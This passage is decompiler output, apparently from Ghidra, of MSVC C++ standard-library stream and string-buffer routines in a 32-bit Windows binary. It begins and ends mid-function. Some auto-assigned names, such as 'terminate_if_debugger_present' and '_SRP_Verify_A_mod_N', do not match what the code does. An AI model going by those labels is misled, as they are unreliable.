    param_2 = (undefined4 *)*param_2;
  }
  iVar5 = FUN_003a2a00((char *)param_2,(int)ppuVar1,0x21);
  if (iVar5 == 0) {
    uVar4 = *(uint *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1);
    pvVar7 = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
    uVar6 = uVar4 | 2;
    if (*(int *)((int)pvVar7 + 0x38) == 0) {
      uVar6 = uVar4 | 6;
    }
    *(uint *)((int)pvVar7 + 0xc) = uVar6 & 0x17;
    if ((*(uint *)((int)pvVar7 + 0x10) & uVar6 & 0x17) != 0) {
      FUN_00399780(pvVar7,(char *)0x0);
    }
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



void FUN_003a6950(void)

{
  int in_EAX;
  void *unaff_ESI;
  
  FUN_003a73b0(unaff_ESI,in_EAX + 0x18);
  return;
}



void __fastcall FUN_003a69a0(undefined **param_1)

{
  *param_1 = (undefined *)
             std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
             vftable;
  if ((*(byte *)(param_1 + 0x10) & 1) != 0) {
    FUN_003aee4b(*(void **)param_1[4]);
  }
  *(undefined4 *)param_1[4] = 0;
  *(undefined4 *)param_1[8] = 0;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[5] = 0;
  *(undefined4 *)param_1[9] = 0;
  *(undefined4 *)param_1[0xd] = 0;
  param_1[0x10] = (undefined *)((uint)param_1[0x10] & 0xfffffffe);
  param_1[0xf] = (undefined *)0x0;
  FUN_003a18e0(param_1);
  return;
}



int __thiscall FUN_003a6a10(void *this,int param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined *puVar3;
  uint uVar4;
  char *pcVar5;
  undefined4 *puVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  
  if ((*(byte *)((int)this + 0x40) & 8) != 0) {
    uVar9 = **(uint **)((int)this + 0x24);
    if ((uVar9 != 0) && (uVar4 = *(uint *)((int)this + 0x3c), uVar9 < uVar4)) {
      iVar7 = **(int **)((int)this + 0x34);
      **(uint **)((int)this + 0x24) = uVar4;
      **(int **)((int)this + 0x34) = (iVar7 + uVar9) - uVar4;
    }
  }
  if (param_1 == -1) {
    return 0;
  }
  uVar9 = **(uint **)((int)this + 0x24);
  if ((uVar9 != 0) && (piVar1 = *(int **)((int)this + 0x34), uVar9 < *piVar1 + uVar9)) {
    *piVar1 = *piVar1 + -1;
    goto LAB_003a6b9d;
  }
  if ((*(byte *)((int)this + 0x40) & 2) != 0) {
    return -1;
  }
  if (uVar9 == 0) {
    uVar9 = 0;
  }
  else {
    uVar9 = (**(int **)((int)this + 0x34) - **(int **)((int)this + 0x10)) + uVar9;
  }
  uVar4 = uVar9 >> 1;
  if (uVar4 < 0x20) {
    uVar4 = 0x20;
  }
  else {
    if (uVar4 == 0) {
      return -1;
    }
  }
  do {
    if (uVar9 <= 0x7fffffff - uVar4) break;
    uVar4 = uVar4 >> 1;
  } while (uVar4 != 0);
  if (uVar4 == 0) {
    return -1;
  }
  pcVar5 = (char *)(uVar4 + uVar9);
  puVar6 = (undefined4 *)FUN_00389ac0(pcVar5);
  puVar2 = (undefined4 *)**(undefined4 **)((int)this + 0x10);
  if ((uVar9 == 0) || (FUN_003aee70(puVar6,puVar2,uVar9), uVar9 == 0)) {
    *(undefined4 **)((int)this + 0x3c) = puVar6;
    **(undefined4 **)((int)this + 0x14) = puVar6;
    **(undefined4 **)((int)this + 0x24) = puVar6;
    **(char ***)((int)this + 0x34) = pcVar5;
    if ((*(byte *)((int)this + 0x40) & 4) != 0) goto LAB_003a6b4d;
    **(undefined4 **)((int)this + 0x10) = puVar6;
    **(undefined4 **)((int)this + 0x20) = puVar6;
    **(undefined4 **)((int)this + 0x30) = 1;
  }
  else {
    *(int *)((int)this + 0x3c) = (int)puVar6 + (*(int *)((int)this + 0x3c) - (int)puVar2);
    iVar7 = **(int **)((int)this + 0x24);
    **(int **)((int)this + 0x14) = (int)puVar6 + (**(int **)((int)this + 0x14) - (int)puVar2);
    iVar7 = (iVar7 - (int)puVar2) + (int)puVar6;
    **(int **)((int)this + 0x24) = iVar7;
    **(char ***)((int)this + 0x34) = pcVar5 + ((int)puVar6 - iVar7);
    if ((*(byte *)((int)this + 0x40) & 4) == 0) {
      iVar7 = **(int **)((int)this + 0x24);
      iVar8 = (**(int **)((int)this + 0x20) - (int)puVar2) + (int)puVar6;
      **(undefined4 **)((int)this + 0x10) = puVar6;
      **(int **)((int)this + 0x20) = iVar8;
      **(int **)((int)this + 0x30) = (iVar7 - iVar8) + 1;
    }
    else {
LAB_003a6b4d:
      **(undefined4 **)((int)this + 0x10) = puVar6;
      **(undefined4 **)((int)this + 0x20) = 0;
      **(undefined4 **)((int)this + 0x30) = puVar6;
    }
  }
  if ((*(byte *)((int)this + 0x40) & 1) != 0) {
    FUN_003aee4b(puVar2);
  }
  *(uint *)((int)this + 0x40) = *(uint *)((int)this + 0x40) | 1;
  **(int **)((int)this + 0x34) = **(int **)((int)this + 0x34) + -1;
LAB_003a6b9d:
  puVar3 = (undefined *)**(int **)((int)this + 0x24);
  **(int **)((int)this + 0x24) = (int)(puVar3 + 1);
  *puVar3 = (char)param_1;
  return param_1;
}



int __thiscall FUN_003a6bc0(void *this,int param_1)

{
  uint uVar1;
  
  uVar1 = **(uint **)((int)this + 0x20);
  if ((uVar1 != 0) &&
     (**(uint **)((int)this + 0x10) <= uVar1 && uVar1 != **(uint **)((int)this + 0x10))) {
    if ((param_1 == -1) ||
       (((char)param_1 == *(char *)(uVar1 - 1) || ((*(byte *)((int)this + 0x40) & 2) == 0)))) {
      **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) + 1;
      **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + -1;
      if (param_1 != -1) {
        ***(char ***)((int)this + 0x20) = (char)param_1;
        return param_1;
      }
      return 0;
    }
  }
  return -1;
}



uint __fastcall FUN_003a6c10(int param_1)

{
  byte *pbVar1;
  byte *pbVar2;
  
  pbVar1 = **(byte ***)(param_1 + 0x20);
  if (pbVar1 == (byte *)0x0) {
    return 0xffffffff;
  }
  if (pbVar1 < pbVar1 + **(int **)(param_1 + 0x30)) {
    return (uint)*pbVar1;
  }
  if ((((*(byte *)(param_1 + 0x40) & 4) == 0) &&
      (pbVar2 = **(byte ***)(param_1 + 0x24), pbVar2 != (byte *)0x0)) &&
     ((pbVar1 < pbVar2 ||
      (pbVar1 <= *(byte **)(param_1 + 0x3c) && *(byte **)(param_1 + 0x3c) != pbVar1)))) {
    if (*(byte **)(param_1 + 0x3c) < pbVar2) {
      *(byte **)(param_1 + 0x3c) = pbVar2;
    }
    **(int **)(param_1 + 0x30) = *(int *)(param_1 + 0x3c) - (int)**(byte ***)(param_1 + 0x20);
    return (uint)***(byte ***)(param_1 + 0x20);
  }
  return 0xffffffff;
}



void __thiscall
FUN_003a6c80(void *this,uint *param_1,uint param_2,uint param_3,int param_4,byte param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  
  uVar2 = **(uint **)((int)this + 0x24);
  if ((uVar2 != 0) && (*(uint *)((int)this + 0x3c) < uVar2)) {
    *(uint *)((int)this + 0x3c) = uVar2;
  }
  if (((param_5 & 1) == 0) || (iVar5 = **(int **)((int)this + 0x20), iVar5 == 0)) {
    if (((param_5 & 2) == 0) || (uVar2 = **(uint **)((int)this + 0x24), uVar2 == 0)) {
      if ((param_2 | param_3) == 0) goto LAB_003a6e1d;
    }
    else {
      if (param_4 == 2) {
        uVar3 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        bVar6 = CARRY4(param_2,uVar3);
        param_2 = param_2 + uVar3;
        param_3 = param_3 + ((int)uVar3 >> 0x1f) + (uint)bVar6;
      }
      else {
        if (param_4 == 1) {
          uVar3 = uVar2 - **(int **)((int)this + 0x10);
          bVar6 = CARRY4(param_2,uVar3);
          param_2 = param_2 + uVar3;
          param_3 = param_3 + ((int)uVar3 >> 0x1f) + (uint)bVar6;
        }
        else {
          if (param_4 != 0) {
            param_2 = 0xffffffff;
            param_3 = 0xffffffff;
          }
        }
      }
      if (-1 < (int)param_3) {
        uVar3 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        iVar5 = (int)uVar3 >> 0x1f;
        if (((int)param_3 <= iVar5) && (((int)param_3 < iVar5 || (param_2 <= uVar3)))) {
          iVar5 = (**(int **)((int)this + 0x10) - uVar2) + param_2;
          **(int **)((int)this + 0x34) = **(int **)((int)this + 0x34) - iVar5;
          **(int **)((int)this + 0x24) = **(int **)((int)this + 0x24) + iVar5;
          goto LAB_003a6e1d;
        }
      }
    }
  }
  else {
    if (param_4 == 2) {
      uVar2 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
      bVar6 = CARRY4(param_2,uVar2);
      param_2 = param_2 + uVar2;
      param_3 = param_3 + ((int)uVar2 >> 0x1f) + (uint)bVar6;
    }
    else {
      if (param_4 == 1) {
        if ((param_5 & 2) == 0) {
          uVar2 = iVar5 - **(int **)((int)this + 0x10);
          bVar6 = CARRY4(param_2,uVar2);
          param_2 = param_2 + uVar2;
          param_3 = param_3 + ((int)uVar2 >> 0x1f) + (uint)bVar6;
        }
        else {
LAB_003a6cf1:
          param_2 = 0xffffffff;
          param_3 = 0xffffffff;
        }
      }
      else {
        if (param_4 != 0) goto LAB_003a6cf1;
      }
    }
    if (-1 < (int)param_3) {
      uVar2 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
      iVar4 = (int)uVar2 >> 0x1f;
      if (((int)param_3 <= iVar4) && (((int)param_3 < iVar4 || (param_2 <= uVar2)))) {
        iVar5 = (**(int **)((int)this + 0x10) - iVar5) + param_2;
        **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) - iVar5;
        **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + iVar5;
        if (((param_5 & 2) != 0) && (iVar5 = **(int **)((int)this + 0x24), iVar5 != 0)) {
          iVar4 = **(int **)((int)this + 0x34);
          iVar1 = **(int **)((int)this + 0x20);
          **(int **)((int)this + 0x24) = iVar1;
          **(int **)((int)this + 0x34) = (iVar4 + iVar5) - iVar1;
        }
        goto LAB_003a6e1d;
      }
    }
  }
  param_2 = 0xffffffff;
  param_3 = 0xffffffff;
LAB_003a6e1d:
  *param_1 = param_2;
  param_1[1] = param_3;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}



void __thiscall FUN_003a6e40(void *this,uint *param_1,uint param_2,int param_3,uint param_4)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  byte in_stack_00000020;
  
  uVar7 = param_4 + param_2;
  uVar3 = **(uint **)((int)this + 0x24);
  uVar6 = ((int)param_4 >> 0x1f) + param_3 + (uint)CARRY4(param_4,param_2);
  if ((uVar3 != 0) && (*(uint *)((int)this + 0x3c) < uVar3)) {
    *(uint *)((int)this + 0x3c) = uVar3;
  }
  if ((uVar7 != 0xffffffff) || (uVar6 != 0xffffffff)) {
    if (((in_stack_00000020 & 1) == 0) || (**(int **)((int)this + 0x20) == 0)) {
      if ((((in_stack_00000020 & 2) != 0) && (uVar3 = **(uint **)((int)this + 0x24), uVar3 != 0)) &&
         (-1 < (int)uVar6)) {
        uVar4 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        iVar5 = (int)uVar4 >> 0x1f;
        if (((int)uVar6 <= iVar5) && (((int)uVar6 < iVar5 || (uVar7 <= uVar4)))) {
          iVar5 = (**(int **)((int)this + 0x10) - uVar3) + uVar7;
          **(int **)((int)this + 0x34) = **(int **)((int)this + 0x34) - iVar5;
          **(int **)((int)this + 0x24) = **(int **)((int)this + 0x24) + iVar5;
          goto LAB_003a6f45;
        }
      }
    }
    else {
      if (-1 < (int)uVar6) {
        uVar3 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        iVar5 = (int)uVar3 >> 0x1f;
        if (((int)uVar6 <= iVar5) && (((int)uVar6 < iVar5 || (uVar7 <= uVar3)))) {
          iVar5 = (**(int **)((int)this + 0x10) - **(int **)((int)this + 0x20)) + uVar7;
          **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) - iVar5;
          **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + iVar5;
          if (((in_stack_00000020 & 2) != 0) && (iVar5 = **(int **)((int)this + 0x24), iVar5 != 0))
          {
            iVar1 = **(int **)((int)this + 0x20);
            iVar2 = **(int **)((int)this + 0x34);
            **(int **)((int)this + 0x24) = iVar1;
            **(int **)((int)this + 0x34) = (iVar2 + iVar5) - iVar1;
          }
          goto LAB_003a6f45;
        }
      }
    }
    uVar6 = 0xffffffff;
    uVar7 = 0xffffffff;
  }
LAB_003a6f45:
  *param_1 = uVar7;
  param_1[1] = uVar6;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}



int * FUN_003a6f70(int *param_1)

{
  undefined **ppuVar1;
  undefined uVar2;
  uint uVar3;
  void *this;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3cdf;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *param_1 = (int)&DAT_003d1bc8;
  param_1[0x14] = (int)std::basic_ios<char,struct_std::char_traits<char>_>::vftable;
  local_8 = 0;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  FUN_00399890();
  ppuVar1 = (undefined **)(param_1 + 1);
  *(undefined ***)((int)this + 0x38) = ppuVar1;
  *(undefined4 *)((int)this + 0x3c) = 0;
  uVar2 = FUN_003a2fa0((uint)this,0x20);
  *(undefined *)((int)this + 0x40) = uVar2;
  if ((*(int *)((int)this + 0x38) == 0) &&
     (uVar3 = *(uint *)((int)this + 0xc) & 0x17 | 4, *(uint *)((int)this + 0xc) = uVar3,
     (*(uint *)((int)this + 0x10) & uVar3) != 0)) {
    FUN_00399780(this,(char *)0x0);
  }
  local_8 = 2;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_ostringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  FUN_003a2e70(ppuVar1);
  *ppuVar1 = (undefined *)
             std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
             vftable;
  param_1[0x10] = 0;
  param_1[0x11] = 4;
  *in_FS_OFFSET = local_10;
  return param_1;
}



void FUN_003a7050(void)

{
  int in_EAX;
  void *unaff_ESI;
  
  FUN_003a73b0(unaff_ESI,in_EAX + 4);
  return;
}



void __fastcall FUN_003a7070(int **param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int *piVar3;
  int **unaff_EBX;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3a12;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  ppiVar1 = (int **)unaff_EBX[1];
  if ((param_1 < ppiVar1) && (ppiVar2 = (int **)*unaff_EBX, ppiVar2 <= param_1)) {
    if (ppiVar1 == (int **)unaff_EBX[2]) {
      FUN_003a3050((int *)unaff_EBX);
    }
    piVar3 = unaff_EBX[1];
    param_1 = (int **)(*unaff_EBX + (((int)param_1 - (int)ppiVar2) / 0x1c) * 7);
    local_8 = 0;
    if (piVar3 == (int *)0x0) goto LAB_003a7135;
    piVar3[5] = 7;
    piVar3[4] = 0;
    *(undefined2 *)piVar3 = 0;
  }
  else {
    if (ppiVar1 == (int **)unaff_EBX[2]) {
      FUN_003a3050((int *)unaff_EBX);
    }
    piVar3 = unaff_EBX[1];
    local_8 = 1;
    if (piVar3 == (int *)0x0) goto LAB_003a7135;
    piVar3[5] = 7;
    piVar3[4] = 0;
    *(undefined2 *)piVar3 = 0;
  }
  FUN_00398300(param_1,(int *)0x0);
LAB_003a7135:
  unaff_EBX[1] = unaff_EBX[1] + 7;
  *in_FS_OFFSET = local_10;
  return;
}



undefined ** __thiscall FUN_003a7150(void *this,byte param_1)

{
  undefined **ppuVar1;
  
  ppuVar1 = (undefined **)((int)this + -8);
  *(undefined ***)(*(int *)(*ppuVar1 + 4) + -8 + (int)this) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)this = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(ppuVar1);
  }
  return ppuVar1;
}



int * __thiscall FUN_003a7190(void *this,byte param_1)

{
  int *piVar1;
  
  piVar1 = (int *)((int)this + -0x60);
  FUN_003a57a0(piVar1);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(piVar1);
  }
  return piVar1;
}



undefined ** __thiscall FUN_003a71c0(void *this,byte param_1)

{
  undefined **ppuVar1;
  
  ppuVar1 = (undefined **)((int)this + -0x18);
  *(undefined ***)(*(int *)(*ppuVar1 + 4) + -0x18 + (int)this) =
       std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*(int *)((int)this + -8) + 4) + -8 + (int)this) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*(int *)((int)this + -0x18) + 4) + -0x18 + (int)this) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)this = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(ppuVar1);
  }
  return ppuVar1;
}



undefined ** __thiscall FUN_003a7220(void *this,byte param_1)

{
  FUN_003a69a0((undefined **)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



undefined ** __thiscall FUN_003a7250(void *this,byte param_1)

{
  undefined **ppuVar1;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c342b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  ppuVar1 = (undefined **)((int)this + -0x50);
  *(undefined ***)(*(int *)(*ppuVar1 + 4) + -0x50 + (int)this) =
       std::basic_ostringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  local_8 = 0;
  FUN_003a69a0((undefined **)((int)this + -0x4c));
  local_8 = 0xffffffff;
  *(undefined ***)(*(int *)(*(int *)((int)this + -0x50) + 4) + -0x50 + (int)this) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)this = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(ppuVar1);
  }
  *in_FS_OFFSET = local_10;
  return ppuVar1;
}



int * FUN_003a72f0(int *param_1,undefined4 param_2)

{
  undefined uVar1;
  uint uVar2;
  void *this;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 uStack8;
  
  uStack8 = 0xffffffff;
  puStack12 = &LAB_003c3c8b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  param_1[2] = 0;
  param_1[3] = 0;
  this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  FUN_00399890();
  *(undefined4 *)((int)this + 0x38) = param_2;
  *(undefined4 *)((int)this + 0x3c) = 0;
  uVar1 = FUN_003a2fa0((uint)this,0x20);
  *(undefined *)((int)this + 0x40) = uVar1;
  if ((*(int *)((int)this + 0x38) == 0) &&
     (uVar2 = *(uint *)((int)this + 0xc) & 0x17 | 4, *(uint *)((int)this + 0xc) = uVar2,
     (*(uint *)((int)this + 0x10) & uVar2) != 0)) {
    FUN_00399780(this,(char *)0x0);
  }
  *(undefined ***)((int)param_1 + *(int *)(param_1[4] + 4) + 0x10) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;
  *in_FS_OFFSET = local_10;
  return param_1;
}



// WARNING: Removing unreachable block (ram,0x003a74c3)

void __thiscall FUN_003a73b0(void *this,int param_1)

{
  uint uVar1;
  uint uVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar3;
  int **in_FS_OFFSET;
  undefined in_stack_ffffffb4;
  undefined4 local_30;
  undefined4 local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2ff8;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  if (((*(uint *)(param_1 + 0x40) & 2) == 0) && (**(uint **)(param_1 + 0x24) != 0)) {
    uVar1 = **(uint **)(param_1 + 0x24);
    uVar2 = *(uint *)(param_1 + 0x3c);
    if (*(uint *)(param_1 + 0x3c) < uVar1) {
      uVar2 = uVar1;
    }
    local_1c = 0xf;
    local_20 = 0;
    local_30 = (void *)((uint)local_30._1_3_ << 8);
    FUN_003894c0(&local_30,(int **)**(int ***)(param_1 + 0x14),
                 (int *)(uVar2 - (int)**(int ***)(param_1 + 0x14)));
    local_8 = 0;
    *(undefined4 *)((int)this + 0x14) = 0xf;
    *(undefined4 *)((int)this + 0x10) = 0;
    *(undefined *)this = 0;
    FUN_003893d0();
    uVar3 = extraout_EDX;
  }
  else {
    if (((*(uint *)(param_1 + 0x40) & 4) != 0) || (**(int **)(param_1 + 0x20) == 0)) {
      in_stack_ffffffb4 = 0;
      local_8 = 2;
      *(undefined4 *)((int)this + 0x14) = 0xf;
      *(undefined4 *)((int)this + 0x10) = 0;
      *(undefined *)this = 0;
      FUN_003893d0();
      uVar3 = extraout_EDX_01;
      goto LAB_003a74cf;
    }
    local_1c = 0xf;
    local_20 = 0;
    local_30 = (void *)((uint)local_30._1_3_ << 8);
    FUN_003894c0(&local_30,(int **)**(int ***)(param_1 + 0x10),
                 (int *)((**(int **)(param_1 + 0x30) + **(int **)(param_1 + 0x20)) -
                        (int)**(int ***)(param_1 + 0x10)));
    local_8 = 1;
    *(undefined4 *)((int)this + 0x14) = 0xf;
    *(undefined4 *)((int)this + 0x10) = 0;
    *(undefined *)this = 0;
    FUN_003893d0();
    uVar3 = extraout_EDX_00;
  }
  if (0xf < local_1c) {
    FUN_003aee4b(local_30);
    uVar3 = extraout_EDX_02;
  }
LAB_003a74cf:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar3,in_stack_ffffffb4);
  return;
}



void FUN_003a74f0(int **param_1)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c33f8;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  uVar3 = _SRP_Verify_A_mod_N();
  if ((char)uVar3 == '\0') {
    FUN_003a7f20(*param_1);
  }
  local_8 = 0xffffffff;
  piVar1 = *(int **)(*(int *)(**param_1 + 4) + 0x38 + (int)*param_1);
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 8))(uVar2);
  }
  *in_FS_OFFSET = local_10;
  return;
}



// WARNING: Type propagation algorithm not settling
// WARNING: Could not reconcile some variable overlaps

void __thiscall
FUN_003a7560(void *this,undefined4 param_1,undefined4 param_2,int *param_3,int param_4,byte param_5,
            char param_6)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  undefined4 *puVar4;
  undefined4 *******this_00;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar5;
  code **ppcVar6;
  int **in_FS_OFFSET;
  uint in_stack_ffffff8c;
  uint local_6c;
  int local_64 [2];
  int local_5c [2];
  undefined4 *******local_54 [4];
  undefined4 local_44;
  uint local_40;
  void *local_38;
  uint local_24;
  uint local_1c;
  int *local_14;
  undefined *puStack16;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack16 = &LAB_003c2e70;
  local_14 = *in_FS_OFFSET;
  local_1c = DAT_003d6664 ^ (uint)&stack0xffffff8c;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xffffff80;
  *in_FS_OFFSET = (int *)&local_14;
  local_5c[0] = param_4;
  if ((*(uint *)(param_4 + 0x14) & 0x4000) == 0) {
                    // WARNING: Load size is inaccurate
    (**(code **)(*this + 0x1c))
              (param_1,param_2,param_3,param_4,in_stack_ffffff8c & 0xffffff00 | (uint)param_5,
               param_6,uVar2);
    uVar5 = extraout_EDX;
  }
  else {
    FUN_00399850();
    local_c = 0;
    piVar3 = (int *)FUN_003a8cf0();
    local_c = 0xffffffff;
    if (local_6c != 0) {
      std::_Lockit::_Lockit((_Lockit *)local_64,0);
      iVar1 = *(int *)(local_6c + 4);
      if ((iVar1 != 0) && (iVar1 != -1)) {
        *(int *)(local_6c + 4) = iVar1 + -1;
      }
      iVar1 = *(int *)(local_6c + 4);
      FUN_003ae995(local_64);
      ppcVar6 = (code **)(~-(uint)(iVar1 != 0) & local_6c);
      if (ppcVar6 != (code **)0x0) {
        (**(code **)*ppcVar6)(1);
      }
    }
    local_40 = 0xf;
    local_44 = 0;
    local_54[0] = (undefined4 *******)((uint)local_54[0] & 0xffffff00);
    local_c = 1;
    if (param_6 == '\0') {
      FUN_003a88c0(piVar3);
      local_c._0_1_ = 3;
      FUN_003893d0();
    }
    else {
      FUN_003a88e0(piVar3);
      local_c._0_1_ = 2;
      FUN_003893d0();
    }
    local_c = CONCAT31(local_c._1_3_,1);
    if (0xf < local_24) {
      FUN_003aee4b(local_38);
    }
    if ((*(uint *)(param_4 + 0x14) & 0x1c0) != 0x40) {
      puVar4 = (undefined4 *)FUN_003a8860(param_2,param_3);
      param_2 = *puVar4;
      param_3 = (int *)puVar4[1];
      param_4 = local_5c[0];
    }
    this_00 = local_54[0];
    if (local_40 < 0x10) {
      this_00 = local_54;
    }
    puVar4 = (undefined4 *)FUN_003a8a30(this_00,local_5c,param_2,param_3);
    uVar5 = *puVar4;
    piVar3 = (int *)puVar4[1];
    *(undefined4 *)(param_4 + 0x20) = 0;
    *(undefined4 *)(param_4 + 0x24) = 0;
    FUN_003a8860(uVar5,piVar3);
    uVar5 = extraout_EDX_00;
    if (0xf < local_40) {
      FUN_003aee4b(local_54[0]);
      uVar5 = extraout_EDX_01;
    }
  }
  *in_FS_OFFSET = local_14;
  terminate_if_debugger_present(local_1c ^ (uint)&stack0xffffff8c,uVar5,param_5);
  return;
}



void FUN_003a77b0(undefined4 param_1,undefined4 param_2,int *param_3,int param_4,byte param_5,
                 undefined4 param_6)

{
  char *_Format;
  size_t sVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined in_stack_ffffffa4;
  char local_50 [68];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xffffffa4;
  _Format = (char *)FUN_003a8540(param_2,*(uint *)(param_4 + 0x14));
  sVar1 = _sprintf_s(local_50,0x40,_Format,param_6);
  FUN_003a85c0(extraout_ECX & 0xffffff00 | (uint)param_5,local_50,param_1,param_4,sVar1,param_2,
               param_3);
  terminate_if_debugger_present(local_c ^ (uint)&stack0xffffffa4,extraout_EDX,in_stack_ffffffa4);
  return;
}



void FUN_003a7830(undefined4 param_1,undefined4 param_2,int *param_3,int param_4,byte param_5,
                 undefined4 param_6)

{
  char *_Format;
  size_t sVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined in_stack_ffffffa4;
  char local_50 [68];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xffffffa4;
  _Format = (char *)FUN_003a8540(param_2,*(uint *)(param_4 + 0x14));
  sVar1 = _sprintf_s(local_50,0x40,_Format,param_6);
  FUN_003a85c0(extraout_ECX & 0xffffff00 | (uint)param_5,local_50,param_1,param_4,sVar1,param_2,
               param_3);
  terminate_if_debugger_present(local_c ^ (uint)&stack0xffffffa4,extraout_EDX,in_stack_ffffffa4);
  return;
}



void FUN_003a78b0(undefined4 param_1,undefined4 param_2,int *param_3,int param_4,byte param_5,
                 undefined4 param_6,undefined4 param_7)

{
  char *_Format;
  size_t sVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined in_stack_ffffffa4;
  char local_50 [68];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xffffffa4;
  _Format = (char *)FUN_003a8540(param_6,*(uint *)(param_4 + 0x14));
  sVar1 = _sprintf_s(local_50,0x40,_Format,param_6,param_7);
  FUN_003a85c0(extraout_ECX & 0xffffff00 | (uint)param_5,local_50,param_1,param_4,sVar1,param_2,
               param_3);
  terminate_if_debugger_present(local_c ^ (uint)&stack0xffffffa4,extraout_EDX,in_stack_ffffffa4);
  return;
}



void FUN_003a7930(undefined4 param_1,undefined4 param_2,int *param_3,int param_4,byte param_5,
                 undefined4 param_6,undefined4 param_7)

{
  char *_Format;
  size_t sVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
